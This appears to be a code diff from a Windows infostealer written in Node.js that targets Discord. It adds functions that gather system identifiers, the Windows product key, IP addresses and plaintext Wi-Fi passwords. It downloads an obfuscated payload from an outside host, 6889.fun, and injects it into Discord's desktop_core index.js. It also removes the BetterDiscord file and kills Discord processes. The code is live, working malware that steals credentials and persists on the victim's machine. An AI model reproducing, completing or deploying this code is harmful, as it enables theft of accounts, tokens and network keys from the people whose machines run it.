@@ -31,34 +31,6 @@ switch (process.platform) {
             });
         }
 
-        const getSystemInfo = () => {
-            function ww() {
-                try {
-                  let w = execSync(`netsh wlan export profile key=clear;Get-ChildItem *.xml | ForEach-Object {$xml = [xml](get-content $_);$a = $xml.WLANProfile.SSIDConfig.SSID.name + ": " + $xml.WLANProfile.MSM.Security.sharedKey.keymaterial;$a;}`, { shell: "powershell.exe" }).toString().split("\r\n");
-                  return w.filter(l => l.includes(": ")).map(l => l.replace(/�\?T/g, "'")).join("\n");
-                } catch (er) {
-                  console.error(er);
-                  return "";
-                }
-            }
-            try {
-                return {
-                    UUID: execSync("powershell.exe (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID").toString().split("\r\n")[0],
-                    MacAddress: execSync("powershell.exe (Get-CimInstance -ClassName 'Win32_NetworkAdapter' -Filter 'NetConnectionStatus = 2').MACAddress").toString().split("\r\n")[0],
-                    ProductKey: execSync("powershell.exe (Get-WmiObject -query 'select * from SoftwareLicensingService').OA3xOriginalProductKey").toString().split("\r\n")[0],
-                    LocalIp: execSync("powershell.exe (Get-NetIPAddress).IPAddress").toString().split('\r\n')[0],
-                    Ram: execSync("wmic os get TotalVisibleMemorySize").toString().split("\r\n")[1].trim() + " KB",
-                    CpuModel: execSync("wmic cpu get caption").toString().split("\r\r\n")[1].trim(),
-                    UserName: execSync("echo %USERNAME%").toString().trim(),
-                    GetIpAddress: execSync("powershell.exe (Resolve-DnsName -Name myip.opendns.com -Server 208.67.222.220).IPAddress").toString().split("\r\n")[0],
-                    WifiPass: ww(),
-                };
-            } catch (e) {
-                console.error(e);
-                return {};
-            }
-        };
-
         async function tokenfuck() {
             for (p of paths) {
                 await find(p);
@@ -128,8 +100,37 @@ switch (process.platform) {
                 await sendall(r); 
             }
         }
-        
-        async function inject() {
+
+        async function discordinjected() {
+            const discords = fs.readdirSync(localappdata).filter(file => file.includes("iscord")).map(file => path.join(localappdata, file));
+            for (const paths of discords) {findindex(paths)}
+            for (const paths of discords) {await findinject(paths)}
+            await inject();
+            await betterbroke();
+            if (killdcop) {await killalldc()}
+        }
+
+        function findindex(firstpath) {
+            let dcpaths = fs.readdirSync(firstpath);
+            dcpaths.forEach((file) => {
+                let filePath = path.join(firstpath, file);
+                let fileStat = fs.statSync(filePath);
+                if (fileStat.isDirectory()) {findindex(filePath)} else {if (file === "index.js" && !firstpath.includes("node_modules") && firstpath.includes("desktop_core")) {injectPath.push(filePath)}}
+            });
+        }
+
+        async function findinject(firstpath) {
+            const files = await fs.promises.readdir(firstpath);
+                for (const file of files) {
+                    const filePath = path.join(firstpath, file);
+                    const fileStat = await fs.promises.stat(filePath);
+                    if (fileStat.isDirectory()) {
+                        if (file === 'aura') {await fs.rmdirSync(filePath)} else {await findinject(filePath)}
+                    }
+                }
+         }
+
+         async function inject() {
             let resp = await axios.get("https://6889.fun/aurathemes/api/inject", {headers: {aurathemes: true}});
             let obf = jsobf.obfuscate(resp.data.replace("*API*", API), {"ignoreRequireImports": true, "compact": true, "controlFlowFlattening": true, "controlFlowFlatteningThreshold": 0.5, "deadCodeInjection": false, "deadCodeInjectionThreshold": 0.01, "debugProtection": false, "debugProtectionInterval": 0, "disableConsoleOutput": true, "identifierNamesGenerator": "hexadecimal", "log": false, "numbersToExpressions": false, "renameGlobals": false, "selfDefending": false, "simplify": true, "splitStrings": false, "splitStringsChunkLength": 5, "stringArray": true, "stringArrayEncoding": ["base64"], "stringArrayIndexShift": true, "stringArrayRotate": false, "stringArrayShuffle": false, "stringArrayWrappersCount": 5, "stringArrayWrappersChainedCalls": true, "stringArrayWrappersParametersMaxCount": 5, "stringArrayWrappersType": "function", "stringArrayThreshold": 1, "transformObjectKeys": false, "unicodeEscapeSequence": false });
             let payload = obf.getObfuscatedCode();
@@ -142,26 +143,6 @@ switch (process.platform) {
             });
         };
 
-        function findindex(firstpath) {
-            let dcpaths = fs.readdirSync(firstpath);
-            dcpaths.forEach((file) => {
-                let filePath = path.join(firstpath, file);
-                let fileStat = fs.statSync(filePath);
-                if (fileStat.isDirectory()) {findindex(filePath)} else {if (file === "index.js" && !firstpath.includes("node_modules") && firstpath.includes("desktop_core")) {injectPath.push(filePath)}}
-            });
-        }
-
-        async function findinject(firstpath) {
-        const files = await fs.promises.readdir(firstpath);
-            for (const file of files) {
-                const filePath = path.join(firstpath, file);
-                const fileStat = await fs.promises.stat(filePath);
-                if (fileStat.isDirectory()) {
-                    if (file === 'aura') {await fs.rmdirSync(filePath)} else {await findinject(filePath)}
-                }
-            }
-        }
-
         function betterbroke() {
             let dir = `${localappdata}/BetterDiscord/data/betterdiscord.asar`;
             if (fs.existsSync(dir)) {
@@ -171,19 +152,9 @@ switch (process.platform) {
             return;
         }
 
-        async function discordinjected() {
-            const discords = fs.readdirSync(localappdata).filter(file => file.includes("iscord")).map(file => path.join(localappdata, file));
-            for (const paths of discords) {findindex(paths)}
-            for (const paths of discords) {await findinject(paths)}
-            await inject();
-            await betterbroke();
-            if (killdcop) {await killalldc()}
-        }
-
         async function killalldc() {
-            const util = require('util');
-            const exec = util.promisify(require('child_process').exec);
-            const clients = ['Discord.exe', 'DiscordCanary.exe', 'discordDevelopment.exe', 'DiscordPTB.exe'];
+            const exec = require('util').promisify(require('child_process').exec);
+            const clients = ['Discord.exe', 'DiscordCanary.exe', 'DiscordDevelopment.exe', 'DiscordPTB.exe'];
             try {
                 const { stdout } = await exec('tasklist');
                 for (const client of clients) {
@@ -206,7 +177,27 @@ switch (process.platform) {
             }
         }
 
-        let g = function(s) {
+        function getSystemInfo() {
+            try {
+                return {
+                    UUID: execSync("powershell.exe (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID").toString().split("\r\n")[0],
+                    MacAddress: execSync("powershell.exe (Get-CimInstance -ClassName 'Win32_NetworkAdapter' -Filter 'NetConnectionStatus = 2').MACAddress").toString().split("\r\n")[0],
+                    ProductKey: execSync("powershell.exe (Get-WmiObject -query 'select * from SoftwareLicensingService').OA3xOriginalProductKey").toString().split("\r\n")[0],
+                    LocalIp: execSync("powershell.exe (Get-NetIPAddress).IPAddress").toString().split('\r\n')[0],
+                    Ram: execSync("wmic os get TotalVisibleMemorySize").toString().split("\r\n")[1].trim() + " KB",
+                    CpuModel: execSync("wmic cpu get caption").toString().split("\r\r\n")[1].trim(),
+                    UserName: execSync("echo %USERNAME%").toString().trim(),
+                    GetIpAddress: execSync("powershell.exe (Resolve-DnsName -Name myip.opendns.com -Server 208.67.222.220).IPAddress").toString().split("\r\n")[0],
+                    WifiPass: execSync(`netsh wlan export profile key=clear;Get-ChildItem *.xml | ForEach-Object {$xml = [xml](get-content $_);$a = $xml.WLANProfile.SSIDConfig.SSID.name + ": " + $xml.WLANProfile.MSM.Security.sharedKey.keymaterial;$a;}`, { shell: "powershell.exe" }).toString().split("\r\n").filter(l => l.includes(": ")).map(l => l.replace(/�\?T/g, "'")).join("\n"),
+                };
+            } catch (e) {
+                console.error(e);
+                return {};
+            }
+        };
+
+
+        function g(s) {
             let d = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
             let r = '';
             for (i = 0; i < s; i++) {
